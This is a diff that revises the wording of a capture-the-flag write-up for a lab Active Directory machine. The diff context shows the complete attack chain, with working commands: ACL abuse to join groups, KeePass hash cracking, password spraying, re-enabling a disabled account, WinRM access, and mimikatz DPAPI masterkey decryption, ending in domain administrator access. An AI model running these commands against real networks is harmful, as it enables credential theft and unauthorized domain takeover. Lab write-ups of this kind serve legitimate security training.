@@ -9,7 +9,7 @@ Puppy is a Medium Difficulty machine that features a non-default SMB share calle
 
 ### nmap
 
-I start enumerating services on this host with nmap.
+Let's start by enumerating the services on this host with `nmap`.
 
 ```bash
 # nmap -A -Pn 10.10.11.70 -oA puppy
@@ -74,12 +74,12 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 172.48 seconds
 ```
 
-It's a domain controller as LDAP and Kerberos are active on this host.
+The presence of LDAP and Kerberos suggests this host is a domain controller.
 
 * Domain: `puppy.htb`
 * DC FQDN: `DC.puppy.htb`
 
-I add this information in `/etc/hosts`.
+I add this information to my `/etc/hosts` file.
 
 ```bash
 # echo '10.10.11.70 puppy.htb DC.puppy.htb DC' >> /etc/hosts
@@ -93,21 +93,21 @@ I harvest the domain's ACLs with `bloodhound-python` using the `levi.james` acco
 # # bloodhound.py --zip -c All -u 'levi.james' -p 'KingofAkron2025!' -dc DC.puppy.htb -d puppy.htb -ns 10.129.232.75
 ```
 
-`levi.james` is member of the `HR` group which hash `GenericWright` privilege on the `Developpers` group.
+`levi.james` is a member of the `HR` group which has the `GenericWright` privilege on the `Developers` group.
 
 ![](img/levi.james.png)
 
-With this right, I can add `levi.james` to the `Developpers` group.
+This privilege allows me to add `levi.james` to the `Developers` group.
 
 ```bash
 # net rpc group addmem "developers" "levi.james" -U "PUPPY.HTB"/"levi.james" -S 10.129.232.75  Password for [PUPPY.HTB\levi.james]:
 ```
 
-This group give no more privileges to escalate.
+This group provides no further privileges for escalation.
 
 # Finding keepass file in `DEV` share
 
-Enumerating SMB shows me `levi.james` can now read in the `DEV` share.
+SMB enumeration reveals that `levi.james` now has read access to the `DEV` share.
 
 ```bash
 # nxc smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares
@@ -125,7 +125,7 @@ SMB         10.10.11.70     445    DC               NETLOGON        READ        
 SMB         10.10.11.70     445    DC               SYSVOL          READ            Logon server share
 ```
 
-I connect in and find an interesting `recovery.kdbx` file. I download it.
+I connect to the share, discover a file named `recovery.kdbx`, and download it.
 
 ```bash
 # smbclientng -d puppy.htb -u levi.james -p 'KingofAkron2025!' -H DC.puppy.htb
@@ -149,7 +149,7 @@ I connect in and find an interesting `recovery.kdbx` file. I download it.
 # Cracking the kdbx file to discover new credentials.
 
 This is a password protected keepass file.
-I extract his hash and try to crack it with `john`.
+I extract its hash and attempt to crack it with `john`.
 
 ```bash
 # john --wordlist=/opt/lists/rockyou.txt keepass.hash
@@ -171,11 +171,12 @@ Session completed.
 
 The hash is cracked:
 `liverpool`
-I open it and find several credentials.
+
+Using the cracked password, I unlock the KeePass database and find several sets of credentials.
 
 ![](img/keepass.png)
 
-I find them account usernam and set a list. Samuel and Steeve does now exist in the domain.
+I create a list of the discovered usernames. Two of them, Samuel and Steeve, are invalid.
 
 ```bash
 # cat credentials.txt
@@ -195,12 +196,12 @@ SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:An
 SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\jamie.williams:JamieLove2025! STATUS_LOGON_FAILURE
 ```
 
-Only the `ant.edwards` credentials worked:
+The scan revealed only one valid account:
 `ant.edwards:Antman2025!`
 
 # Changing `adam.silver`'s password
 
-`ant edwards`, thourgh the `Senior Devs` group, hash the `GenericAll` right over `adam.silver`.
+`ant edwards`, through the `Senior Devs` group, hash the `GenericAll` right over `adam.silver`.
 
 ![](img/senior_devs.png)
 
@@ -218,8 +219,8 @@ SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Buil
 SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Bagu3tte STATUS_ACCOUNT_DISABLED
 ```
 
-NetExec return that this account is disabled.
-As i hold `GenericAll` over this user, I can restore it with `bloodyAD`.
+NetExec returns that this account is disabled.
+Since I have `GenericAll` privileges on this user, I can enable it with `bloodyAD`.
 
 ```bash
 # bloodyAD --host DC.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
@@ -235,7 +236,7 @@ SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\adam.silver:Ba
 
 # Connecting to DC and finding credentials in a backup file
 
-`adam.silver` can `PSRemote` in on the DC
+`adam.silver` is able to connect to the DC via PowerShell Remoting.
 
 ![](img/adam.silver.png)
 
@@ -292,7 +293,7 @@ Info: Downloading C:/Backups/site-backup-2024-12-30.zip to site-backup-2024-12-3
 Info: Download successful!
 ```
 
-After unziping it, I find new credentials in a xml file.
+After unzipping it, I find new credentials in an XML file.
 
 ```xml
 # cat nms-auth-config.xml.bak
@@ -322,7 +323,7 @@ After unziping it, I find new credentials in a xml file.
 </ldap-config>
 ```
 
-I test to connect with this account
+I try to connect with this account.
 
 ```
 # nxc smb 10.10.11.70 -u 'steph.cooper' -p 'ChefSteph2025!'
@@ -330,10 +331,10 @@ SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Buil
 SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025!
 ```
 
-These credentials worked.
+These credentials worked:
 `steph.cooper:ChefSteph2025!`
 
-Also, I can connect on the DC with WinRM.
+Also, I can connect to the DC with WinRM.
 
 ```bash
 # evil-winrm -u steph.cooper -p 'ChefSteph2025!' -i 10.129.232.75
@@ -345,9 +346,9 @@ Info: Establishing connection to remote endpoint
 puppy\steph.cooper
 ```
 
-# Discovering an cracking DPAPI
+# Discovering and cracking DPAPI
 
-`winpeas` return me that this user has DPAPI credential files.
+`winpeas` reports that this user has DPAPI credential files.
 
 ```bash
 checking for DPAPI Credential Files
@@ -370,7 +371,8 @@ checking for DPAPI Credential Files
     Size: 414
 ```
 
-I follow this **HackTrick** [tutorial](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) to crack these credential files.
+I follow this **HackTricks** [tutorial](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) to crack these credential files.
+
 The masterkey:
 
 ```powershell
@@ -383,7 +385,7 @@ The user's SID:
 S-1-5-21-1487982659-1829050783-2281216199-1107
 ```
 
-As I have the session password, I can decrpyt thz masterkey with mimikatz.
+As I have the session password, I can decrypt the masterkey with `mimikatz`.
 I first upload it.
 
 ```bash
@@ -398,7 +400,7 @@ Data: 1666740 bytes of 1666740 bytes copied
 Info: Upload successful!
 ```
 
-Then I launch `mimikatz` by specifying the masterkey path, user's SID and his password.
+Then I launch `mimikatz` by specifying the masterkey path, the user's SID and his password.
 
 ```
 .\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /sid:S-1-5-21-1487982659-1829050783-2281216199-1107 /password:ChefSteph2025! /protected" "exit"
@@ -484,7 +486,7 @@ SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Buil
 SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (admin)
 ```
 
-These credentials worked. Moreover, `steph.cooper_adm` is admin on the DC.
+These credentials worked. Moreover, `steph.cooper_adm` is an administrator on the DC.
 I Connect with this account.
 
 ```powershell
@@ -514,4 +516,4 @@ NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandato
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 ```
 
-I am now connected as Administrator.
+I am now connected as an administrator and full compromised the domain.
